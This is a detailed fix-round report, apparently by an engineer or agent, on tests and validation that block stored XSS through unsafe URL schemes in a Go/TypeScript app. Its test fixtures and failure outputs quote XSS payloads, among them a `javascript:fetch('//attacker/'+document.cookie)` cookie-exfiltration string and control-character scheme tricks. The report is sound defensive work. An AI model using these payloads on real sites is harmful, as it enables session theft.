# dev-xss-r2 — fix round for the stored-XSS URL scheme change

Branch: `url-scheme-validation-r2`
Base: `d4c4e6b`
Head: `0bc9b72` (last code commit: `cedef7b`; `0bc9b72` is the project-log entry, docs only)
Nothing pushed. `git status --porcelain` is empty (stated again at the end, after the log commit).

Brief: `/scion-volumes/scratchpad/projects/farmtable/briefs/dev-xss-r2.md`
Review legs read in full before writing code: `review-xss-r1.md`, `test-xss-r1.md`, `audit-xss-r1.md`.

## Commits

| commit | what |
|---|---|
| `158f9b0` | MUST 1 — declare `jsdom` / `@types/jsdom` / `@types/node`; fix `tsconfig.json` `types` |
| `e5ea360` | MUST 2 — fixtures that can falsify the scheme allow-list; host-guard reachability pin |
| `b34c44c` | MUST 3 — JSDOM pin driven through the real render functions |
| `5f948c9` | MUST 4 — validate `remote_url` on the passthrough read path |
| `a582a75` | MUST 4 — `SetTestGraphQLClient` marked test-only |
| `5c65382` | R4 — web test discovery replaces two hand-maintained registries |
| `ba79b04` | F6 + F3 — shared server/client fixture file; `urlBearingRemoteDataKeys` coverage test |
| `859a54d` | scanner recall + binding-scoped `viaSafeHref` + ALLOWED uniqueness |
| `cedef7b` | F9 + F10 — list position and rejection attribution |
| `0bc9b72` | deliverable 3 — `.design/project-log/url-scheme-validation-r2-fix-round.md` (docs only, no gate impact) |

## Gate table — measured in a FRESH CLONE

`git clone --branch url-scheme-validation-r2 /workspace /tmp/fresh` at `cedef7b`, then each gate
run as a child process with its exit code read directly (never through a pipe). The one commit
after `cedef7b` (`0bc9b72`) adds a single markdown file under `.design/project-log/` and touches no
input to any gate, so the table below is still the head measurement.

| gate | exit | note |
|---|---|---|
| `npm ci` (in `web/`) | **0** | |
| `npm run build` | **0** | was **2** at `d4c4e6b`, with 8 TS errors and `vite build` never reached |
| `npm test` | **0** | 3 test files discovered and run |
| `go build ./...` | **0** | *after* `npm run build` — see the ordering note below |
| `go vet ./...` | **1** | exactly the 4 pre-existing copylocks in `internal/server/server.go`, as the EM predicted |
| `go test ./...` | **1** | single failure: `--- FAIL: TestWatchTasks_NoInitial (5.01s) watch_test.go:118: timed out waiting for event` — the documented ~8% flake. Re-ran the three watch tests 5× in the same clone: **0 failures, all 5 runs exit 0.** |

`go vet` output, in full:

```
internal/server/server.go:1509:14: assignment copies lock value to ephReq: ... GetReadyTasksRequest ...
internal/server/server.go:1619:14: assignment copies lock value to ephReq: ... GetBlockedTasksRequest ...
internal/server/server.go:1827:13: assignment copies lock value to ephReq: ... GetCriticalPathRequest ...
internal/server/server.go:2004:13: assignment copies lock value to ephReq: ... GetBottlenecksRequest ...
```

**Ordering note, and I want this read rather than skimmed.** The Go gates above were run *after*
`npm run build` in the same clone. That is the production ordering (`Dockerfile.server` builds the
frontend stage first) but it is not the order a Go developer would use, so I measured the other
arm separately in a second untouched clone:

```
/tmp/fresh2, no npm step:
  ls web/dist            -> No such file or directory
  go build ./...         -> exit 1   assets.go:5:12: pattern all:web/dist: no matching files found
  go vet ./...           -> exit 1   (same error, vet never reaches the copylocks)
```

That is task **#100**, pre-existing, explicitly not mine. It is recorded here because "go build
exit 0" is only true on this branch *conditionally*, and a reader who does not know the condition
will draw the wrong conclusion — which is the exact failure mode the EM warned about.

## MUST 1 — the production container build

**Reproduced first.** Fresh clone at `d4c4e6b`, `npm ci` then `npm run build`: **exit 2**, 8 TS
errors, `vite build` never runs. `Dockerfile.server:4` is `RUN npm ci` and `:6` is
`RUN npm run build` (verified against the file; the brief's line numbers are correct).

Cause: `tsconfig.json` `"include": ["src"]` covers `*.test.ts`; the new test files import `jsdom`
and `node:fs`/`node:path`/`node:url`; none of `jsdom`, `@types/jsdom`, `@types/node` was declared.

Fix: all three declared in `web` devDependencies, lockfile regenerated, and `tsconfig.json`
`"types": ["vite/client", "node"]`.

Two things worth recording:

- **Observation.** `node` types previously arrived *transitively*, through `@types/jsdom`'s
  `/// <reference types="node" />`. That is why this worked in the authoring environment and broke
  the moment the package set was reinstalled from the manifests. It is declared explicitly now.
- **Inference, and a correction to the brief.** The brief lists "fix the implicit-`any` at
  `safe-url.test.ts:171`" as a separate fix step. It is not a separate defect — it is a *cascade*
  of the missing `@types/node` and disappears on its own once the types are declared. I made no
  edit at that line.

**Decision taken deliberately:** test files stay inside the build's type-check. Excluding them from
`tsconfig.json` would also have made `npm run build` pass, and it is the tempting fix. It is the
wrong one: type-checking the tests is what made this loud instead of invisible.

## MUST 2 — fixtures that can falsify the allow-list

Confirmed the finding before fixing it: with the original 21 rejection fixtures, **deleting the
scheme check outright left the suite GREEN**, as did adding `javascript:` to `SAFE_SCHEMES`. Every
fixture was rejected by the parse throwing or by the host check, so none of them could see the
allow-list.

Added four fixtures that isolate it — three WHATWG *special* schemes, which parse successfully and
yield a non-empty hostname so only the allow-list can refuse them, plus one prefix-vs-membership
case:

```
['ftp', 'ftp://evil.com/x']
['ws',  'ws://evil.com/x']
['wss', 'wss://evil.com/x']
['httpx prefix not membership', 'httpx://evil.com/x']
```

RED on mutation (a), delete the scheme check:

> `Error: safeHref("ftp://evil.com/x") should be undefined for "ftp", got "ftp://evil.com/x"`

RED on mutation (c), add `javascript:` to `SAFE_SCHEMES` — same assertion, `javascript` row.

### Mutation (b), the hostname check — the brief is wrong here, twice

**Predicted:** the brief's suggested fixture `http:/\/\evil.com` would be rejected by the hostname
check. **Measured:** it is **accepted** by `safeHref`. The WHATWG parser reads the backslashes as
slashes:

```
"http:/\\/\\evil.com" -> href "http://evil.com/"  hostname "evil.com"
```

Adding it to the rejection table would have made the suite fail. That is errata item 1.

Going further: **no input reaches the hostname check at all.** Both allow-listed schemes are
WHATWG *special* schemes, and the parser requires those to have a non-empty host — `new URL('https://')`
throws rather than yielding `hostname === ''`. Measured across 15 empty-host shapes: zero arrive at
that line. Mutation (b) is therefore **unkillable by any fixture**, and no rewording of the brief
changes that; unreachable code has no behaviour to assert on. That is errata item 2.

I kept the guard, because it is what makes widening `SAFE_SCHEMES` fail *closed*: every
script-bearing scheme (`javascript:`, `data:`, `vbscript:`, `blob:`, `mailto:`) is **non-special**
and parses with `hostname === ''`. What is pinnable is the *reachability precondition*, so that is
what `testHostGuardIsAFailClosedBackstop()` pins: it loops `SAFE_SCHEMES` asserting each is special,
and goes red the moment a non-special scheme is allow-listed — i.e. the moment the guard stops
being dead and starts carrying weight. It carries its own positive control (`new URL('javascript://')`
must parse, with `hostname === ''`), without which the loop would pass if `new URL` threw for
everything.

The false claim about `http:/\/\evil.com` was also written into `safe-url.ts`'s comment. Corrected
in place, with the measurement.

## MUST 3 — the JSDOM pin now drives the real render path

`testPayloadNeverReachesHrefAttribute` declared its own `renderGuarded()` copy. Confirmed the
consequence: replacing `safeHref(url)` with `url` in **either** production function shipped green,
because neither function was ever imported. A check derived from the thing it checks cannot falsify
it.

`renderPrLink` and `renderExternalSourceLink` are now exported (with a comment saying why, and
warning against inlining them back), and the test drives both through lit's `render()` into JSDOM.

The mechanical obstacle, since it will come up again: DOM globals must be installed **before** lit
or any component module is evaluated, because `@customElement` calls `customElements.define()` as
an import side effect. Hence dynamic `import()` plus top-level `await`. Copying a hand-picked list
of globals was not enough (`Document is not defined`); the working version iterates
`Object.getOwnPropertyNames(dom.window)`.

RED, with the file still importing `safeHref`:

> `Error: ft-inspector-code.ts::renderPrLink: a javascript: URL must not produce an anchor at all, got: <!----><a class="pr-link" target="_blank" rel="noopener" href="javascript:fetch('//attacker/'+document.cookie)">...`

The positive control is kept and relabelled to say what it controls — the harness, not the guard —
and it now also pins `target="_blank"` and `rel="noopener"` **behaviourally off the rendered node**,
not only by source grep.

## MUST 4 — the real platform-sync path

The design doc excluded "platform-sync writes (values originate from the upstream GitHub API)".
That sentence describes `internal/platform/github/github.go::buildRemoteData`, which has **no
production caller**. The live path is the passthrough read:

```
graphql_queries.go:476-487 -> passthrough.go:147 -> convert.go -> ft-inspector-meta.ts
                                                     (wired at main.go:61)
```

`remote_url` is synthesised from the GraphQL response on **every** `ListTasks`/`GetTask` and never
persisted, so no write-boundary check can structurally reach it — and
`GitHubPassThroughStore.UpdateTask` ignores `RemoteData` entirely, so a value validated there is
discarded. The exclusion was justified against dead code.

Fix: validate on the way **out**, in `convert.go::taskToProto`, which is the single convergence
point for every read. It **degrades** — drops the field — rather than erroring, so a bad upstream
URL cannot fail the whole read.

`TestPassthroughReadDropsUnsafeRemoteURL`: 6 payload classes, each through a real mock GraphQL
endpoint, a real ent store, a real gRPC server. All 6 RED without the guard, e.g.

> `passthrough_url_test.go:184: remote_url "javascript:alert(1)" from the passthrough read reached the client; convert.go must drop non-http(s) values`

Each subtest carries a positive control — a second, legitimate issue in the **same** response whose
`remote_url` must survive unchanged — plus a check that `remote_id` is still populated (degrade, not
fail), plus an anti-vacuity guard on the table itself.

**Not attacker-reachable today**, and I am not writing it up as exploitable: `issue.URL` is
GitHub-generated, there is no webhook receiver and no configurable API base URL. This is a missing
control, not an open hole. The test's job is to keep that true by construction rather than by
argument.

**Deliberately NOT changed: `pr["url"]` at `convert.go:358-363`.** It is the same shape and I
considered giving it the same treatment. It has a real guarded write boundary and no passthrough
synthesis, so it has no ongoing unguarded source; the only bad values are legacy rows, and
`safeHref` is their control. Adding a silent server-side drop there would make legacy rows *vanish*
from the UI instead of degrading to visible inert text, which is worse for the user and hides the
data. Recorded in the commit message.

Design doc corrected to name `passthrough.go`. `safe-url.ts:5-8` rewritten to state the real,
**per-binding** weight — `PullRequest.url` is the sole control for legacy rows, `Task.remote_url`
genuinely is a second layer now — instead of a flat "defence in depth" claim.

### `SetTestGraphQLClient` — the brief's instruction does not build

Audit F1 asked for this helper to move into an `export_test.go`. **Measured: it does not compile.**
`s.gql.v4` is unexported and both callers are in `package server_test`, not `package github`; an
`export_test.go` is compiled only into its own package's test binary.

```
go build ./...              exit 0
go vet ./internal/server/   exit 1
vet: internal/server/passthrough_e2e_test.go:111:13: undefined: ghplatform.SetTestGraphQLClient
```

Substitute shipped: a `testing.TB` parameter, so the test-only contract is in the signature and a
production caller would have to manufacture a `testing.TB`. The real fix is relocating both callers
into `package github`, which is larger than the change it belongs to. Both the measurement and the
reason are written into the file so the next reader does not re-attempt it. Errata item 4.

## R4 — the web test runner (not on the SHOULD list; done because it was in the way)

Review finding R4: a test file had to be registered in **two** hand-maintained places
(`tsconfig.test.json` `include`, and the `&&` chain in `package.json`), and forgetting either made
it silently not run. I was about to add two test files into exactly that trap.

`tsconfig.test.json` now globs `src/**/*.test.ts`; `scripts/run-tests.mjs` discovers the emitted
tree, cross-checks it against the sources in both directions, runs **every** file (the `&&` chain
stopped at the first failure and hid the rest), and reads exit codes straight off the child process.
`rm -rf .tmp-test` before compiling, so a renamed test cannot leave a stale passing `.js`.

RED, by dropping a deliberately-failing `src/util/probe-discovery.test.ts` into the tree and
touching no configuration at all:

```
Discovered 4 test file(s).          <- was 3
FAIL: 1 of 4 test file(s) failed:
  src/util/probe-discovery.test.ts (exit 1)
```

and the two files ordered after it still ran and still reported `ok`, which the `&&` chain would not
have done. Under the old runner that file compiled to nothing and executed never: exit 0, no output,
no trace. Probe removed.

This paid for itself twice within the round: two later probes each produced **two** `Error:` lines
from **two** different files in a single run.

## F6 — the server/client differential (SHOULD, done)

`safe-url.ts` claimed the two guards agreed, and concluded "a scheme the client allows and the
server rejects is unreachable". The scheme **sets** agree. The **decisions** do not.

Both sides now read one file, `testdata/url-scheme-cases.json`. Two independent tables can both be
green while disagreeing with each other — which is the state this branch shipped in — so there is
only one table. The Go half asserts the `server` column against `validateURLField`; the TS half
asserts the `client` column against `safeHref`.

Measured over 42 inputs: **33 agree, 9 diverge.**

| case | input | server | client | why |
|---|---|---|---|---|
| empty | `""` | accept | reject | deliberate on both sides: "unset" vs "render no link" |
| backslash host confusion | `http:/\/\evil.com` | reject | accept | WHATWG → host `evil.com`; `net/url` → `Host == ""` |
| single slash host | `http:/example.com` | reject | accept | WHATWG → `http://example.com/` |
| opaque no slash | `http:example.com` | reject | accept | WHATWG → `http://example.com/` |
| bare space in path | `http://example.com/a b` | reject | accept | server's control-char pre-check; WHATWG percent-encodes |
| trailing newline | `https://example.com/x\n` | reject | accept | server's control-char pre-check; WHATWG strips it |
| bad percent escape | `http://example.com/%zz` | reject | accept | `net/url` errors on the escape |
| out of range port | `https://example.com:99999/x` | **accept** | reject | server more permissive: `net/url` does not range-check the port |
| empty host with path | `https:///x` | reject | accept | WHATWG promotes the first path segment: `hostname === "x"` |

**Security reading, stated separately from the measurement.** None of the 9 is a scheme escalation.
Where the client is the more permissive of the two, the input resolves to an http(s) URL — an
attacker-chosen **host**, which is already reachable through a plainly-accepted `https://evil.com/`,
not an attacker-chosen **scheme**. They are broken-link and inconsistency bugs, not XSS. The point
of pinning them is that the disagreement is now bounded and visible rather than denied in a comment.

`TestSharedFixturesRecordRealDivergences` is the anti-vacuity control: it refuses a file with zero
divergences (someone "reconciling" the two guards by rewriting a column) *and* a file with zero
agreements (a broken measurement), and requires every divergence to carry a written reason.

RED probes, each reverted by `cp` from `/tmp`:

- disable the control-char pre-check → `TestValidateURLFieldMatchesSharedFixtures/bare_space_in_path`:
  `validateURLField("http://example.com/a b") = accept, but testdata/url-scheme-cases.json records reject`
- add `ftp` to `allowedURLSchemes` → `TestValidateURLFieldMatchesSharedFixtures/ftp`
- rewrite every client column to match the server → `TestSharedFixturesRecordRealDivergences`:
  `no divergences left in testdata/url-scheme-cases.json`
- flip one client column → `Error: safeHref("http://example.com/%zz") = accept, but ... records reject for "bad percent escape"`

### Two predictions, and one miss

- **Predicted** the fixture set would kill **G4** (`allowedURLSchemes[s]` → `strings.HasPrefix(s, "http")`).
  **Measured: killed** — `TestValidateURLFieldMatchesSharedFixtures/httpx_prefix_not_membership`.
- **Predicted G7** (delete `strings.ToLower`) would **survive**, because `net/url` already lowercases
  the scheme. **Measured: survived.** No fixture can kill it. It is unreachable in the same sense
  the hostname guard is, and the code comment at `urlvalidate.go:65-67` already says exactly this.
  Reported rather than papered over.
- **Miss.** I expected disabling the control-character pre-check (G6/G8) to fail several fixtures.
  It failed **exactly one**: `bare space in path`. Measured directly against `net/url`:

  ```
  "java\tscript:alert(1)"   net/url ERROR: invalid control character in URL
  "java\nscript:alert(1)"   net/url ERROR: invalid control character in URL
  "\tjavascript:alert(1)"   net/url ERROR: invalid control character in URL
  " javascript:alert(1)"    net/url ERROR: first path segment in URL cannot contain colon
  ```

  So the pre-check is redundant with `net/url` for **every** control-character scheme-confusion
  input I could construct; its unique contribution across 42 fixtures is one input that is not a
  security case. **This contradicts the brief**, which says the pre-check "is what makes the
  allow-list sound". I kept it — the brief said not to simplify it away, and the code's own comment
  gives the honest justification ("relying on that would leave the guarantee dependent on a parser
  implementation detail") — but the stronger claim is not supported by measurement. Errata item 6.

## F3 — `urlBearingRemoteDataKeys` (SHOULD, done)

`TestURLBearingRemoteDataKeysCoversConvertReads` reads `convert.go` and fails on any `RemoteData`
key that is in neither `urlBearingRemoteDataKeys` nor an explicitly-reasoned non-URL list.

It found a real unclassified key on its first run: `RemoteData["platform"]` (`convert.go:259`).
Inspected: safe — `platformStringToProto` maps it onto a closed `pb.Platform` enum, so the caller's
string never reaches the client verbatim, let alone an `href`. Classified with that reason. Also
checks the reverse direction, so an entry cannot outlive the read it describes.

Positive control, RED by hiding the key behind a `const`:

> `positive control: the extractor found no RemoteData["remote_url"] read in .../convert.go. It found [platform remote_id]. This test can no longer see convert.go's RemoteData reads, so it is not checking anything`

## Scanner recall and scoping (SHOULD, done)

Three shapes reached an `href` without the scanner firing. Measured against the **old** rules:

```
OLD-MISSES  html`<a href="${raw}">x</a>`               (quoted binding)
OLD-MISSES  el.setAttribute('href', raw)
OLD-MISSES  use.setAttributeNS(XLINK, 'xlink:href', raw)
OLD-FIRES   svg`<use xlink:href=${raw} />`
```

The quoted form is what most people write from muscle memory and `setAttribute` is the standard way
to set an attribute outside a template, so the scanner was missing the two likeliest routes back to
the original defect. Two new rules; 7 new positive fixtures; 4 new negative fixtures
(`setAttribute('data-href', …)`, `getAttribute`, `removeAttribute`, quoted static href) so the new
rules cannot over-fire. RED with a probe file dropped into the tree:

```
util/probe-binding.ts:3 [dynamic href/src attribute binding (quoted)]
util/probe-binding.ts:4 [href/src written via setAttribute]
```

**`viaSafeHref` was file-scoped** — it asserted the file imports `safeHref` *somewhere*, which is
satisfied by a file that guards one binding and leaves the next one bare. That is the defect the
scanner exists to catch. It is now scoped to the binding: the interpolated identifier must be
assigned from `safeHref()` within the enclosing block, and an entry that does not interpolate a
bare identifier is rejected rather than assumed guarded. RED by replacing
`const href = safeHref(url)` with `const href = url` and **leaving the import in place**:

> `components/inspector/ft-inspector-code.ts:34 is allow-listed as "href comes from safeHref()", but nothing in the enclosing block assigns href from safeHref().`

**`ALLOWED` entries had no location**, so one approval silently covered every identical line in the
file. Each entry must now match **exactly one** line. RED by adding a second function with a
byte-identical binding line:

> `ambiguous ALLOWED entry: ... matches 2 lines (34, 157).`

The audit asked for a pinned line number per entry instead. I did not do that, and the reasoning is
in the file: a pinned line number churns on every edit above the binding and adds nothing once
uniqueness is enforced. The real line numbers are reported in the failure messages, where they are
useful. Flagging this as a deliberate deviation rather than burying it.

## F7–F10 (SHOULD, done)

- **F7** (control-char / case-fold / bare-space branches unpinned) — now fixtures in the shared
  file, decided against a recorded expectation. G6/G8 killed by `bare space in path`. **G7 remains
  unkillable**; see the prediction section above.
- **F8** (prefix vs membership) — `httpx://evil.com/x`, in both the TS rejection table and the
  shared fixtures. G4 killed.
- **F9** (list-position blindness) — every URL fixture sat at index 0 of a one-element list. Both
  write boundaries now carry a legitimate PR at index 0 and the payload at index 1:

  ```
  G27 (UpdateTask validates only add_pull_requests[0]) ->
    urlvalidate_rpc_test.go:68: UpdateTask accepted "javascript:..." at
    add_pull_requests[1].url, want InvalidArgument
  G11 (import validates only pull_requests[0]) ->
    urlvalidate_rpc_test.go:188: ImportCollection err = <nil>, want InvalidArgument
  ```

  The frontend had the same blind spot for a different reason — the JSDOM test drove `renderPrLink`
  one call at a time. `testGuardHoldsForEveryItemInAList` renders the **real** `<ft-inspector-code>`
  custom element (its own `.map()`, not a copy) with two PRs in **both** orderings.
  Poisoned-first catches "the loop bails out after the first rejection"; poisoned-second catches
  "only index 0 is guarded". Only one ordering goes red under the index-0 mutation, which is why
  both exist:

  > `poisoned second: exactly one href should survive the list, the legitimate one. Got ["https://github.com/acme/widgets/pull/2","javascript:fetch('//attacker/'+document.cookie)"]`

  With a positive control that the component actually rendered both list items, without which
  "exactly one href" would also be satisfied by a component that dropped every item after the first.

- **F10** (rejection could not be attributed) — all four rejection tests now assert the message
  names the offending field, and the import subtests assert nothing was persisted (their
  `UpdateTask` siblings already did). RED when the message stops naming the field:

  > `message = "the document could not be imported", want it to name add_pull_requests[1].url`

  **Writing that assertion exposed a production defect.** `UpdateTask` reported
  `invalid add_pull_requests.url` with **no index**, so a caller sending several pull requests could
  not tell which one was rejected — while the import path already included the index. Fixed in
  `server.go`; it is the only production behaviour change in this round outside `convert.go`.

## Everywhere the brief (or a review leg) is wrong

1. **MUST 2 fixture.** The brief says the hostname check "needs its own discriminating fixture
   `http:/\/\evil.com`". `safeHref` **accepts** that input — WHATWG yields `hostname === "evil.com"`.
   Adding it to the rejection table makes the suite fail.
2. **MUST 2 mutation (b).** The brief asks for RED on "delete the hostname check". That mutation is
   **unkillable by any fixture**: no input reaches the check, because both allow-listed schemes are
   WHATWG special schemes whose empty-host forms throw. Pinned the reachability precondition instead.
3. **MUST 1, the implicit-`any`.** "Fix the implicit-any at `safe-url.test.ts:171`" is listed as a
   distinct fix step. It is a cascade of the missing `@types/node` and resolves itself. No edit made
   at that line.
4. **MUST 4, `export_test.go`.** "Move `SetTestGraphQLClient` … into an `export_test.go`" does not
   build: `vet: internal/server/passthrough_e2e_test.go:111:13: undefined: ghplatform.SetTestGraphQLClient`.
   The callers are in `package server_test`.
5. **The `target="_blank"` framing** in the base project log said the anchors' `target="_blank"` was
   "an incidental mitigation that nothing pinned, so it is now pinned" — but what pinned it was a
   **source grep** (`testExternalAnchorsKeepTargetBlank` reads the `.ts` file and looks for a
   substring). That is not a pin on behaviour; it survives any change that keeps the substring while
   changing what renders. It is now *also* asserted off the rendered DOM node. Not a factual error,
   but the claim was stronger than the evidence.
6. **The control-character pre-check.** The brief's "must not regress" section says the pre-check
   "is what makes the allow-list sound". Measured: `net/url` independently rejects every
   control-character scheme-confusion input tried; the pre-check's unique contribution across 42
   fixtures is `http://example.com/a b`, which is not a security case. Kept, as instructed, and its
   own code comment states the honest justification — but the brief's claim overstates it.
7. **test-xss-r1's "rejected by both guards" framing** (16 of 21 fixtures) is true only
   counterfactually — *if* the scheme check were absent. With it present, nothing reaches the host
   check at all, for any of the 21.
8. **Verified correct, listed so it is not re-litigated:** `Dockerfile.server:4` is `RUN npm ci` and
   `:6` is `RUN npm run build`. The brief's line numbers are right.
9. **Minor:** the brief's opening contains a truncated sentence — "Do NOT create any directory named
   here". I read it as the surrounding scope fence and proceeded.
10. **Non-blocking observation, outside my scope:** `gofmt -l internal/server/` reports
    `internal/server/scopes.go` as unformatted on this branch. Pre-existing; I did not touch that
    file and did not reformat it, since "don't clean up code adjacent to your change" applies.

## What I did not fix, and why

- **Audit F2** — the `unsafeHTML(renderMarkdown(...))` route. Explicitly routed to the #195
  markdown-sanitize track. Not touched, not scoped, not filed.
- **CSP** (#85/#91) — not mine.
- **`web/dist` missing in a clean checkout** (#100) — pre-existing, explicitly not mine. Measured
  and reported above because it qualifies the `go build` gate result, not because I intend to fix it.
- **The five auth/CORS/scope findings** — not mine.
- **G7 (`strings.ToLower`)** — cannot be killed by a fixture; `net/url` already lowercases. Reported,
  not papered over with a test that appears to cover it.
- **`pr["url"]` read-path validation in `convert.go`** — deliberate, reasoned above.
- **Relocating `SetTestGraphQLClient`'s callers into `package github`** — the only way to do the
  `export_test.go` move properly, and larger than the change it belongs to. Marked with `testing.TB`
  and documented in place.
- **Pinned line numbers in `ALLOWED`** — replaced with a uniqueness assertion; reasoning above and
  in the file.

## Tree state

`git status --porcelain` produces no output. All probe mutations were reverted by snapshot restore
(`cp` from `/tmp`), each verified with `diff -q` against the snapshot, and the suites re-run green
afterwards. Nothing pushed.
